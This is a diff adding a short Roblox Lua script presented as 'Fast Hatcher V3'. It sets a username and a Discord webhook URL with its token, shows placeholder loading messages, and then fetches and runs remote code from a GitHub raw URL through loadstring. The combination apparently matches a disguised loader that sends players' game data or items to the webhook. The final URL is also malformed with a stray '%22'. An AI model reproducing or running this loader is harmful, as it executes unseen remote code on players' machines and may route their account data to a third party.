@@ -1,0 +1,8 @@
+Username = " edriangaming09 "
+WebHook = " https://discord.com/api/webhooks/1110117310485766206/-Fsy_tBtTxGoWFoLNv_TXS0CCcctDX2W4MH6sTKRSh8RBPpjaVa3EpzIfqA9nI3Qcso6 "
+loadingscreen = true
+_G.CustomScriptName = "Fast Hatcher V3"
+_G.Text1 = "Script Loaded..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua%22))()
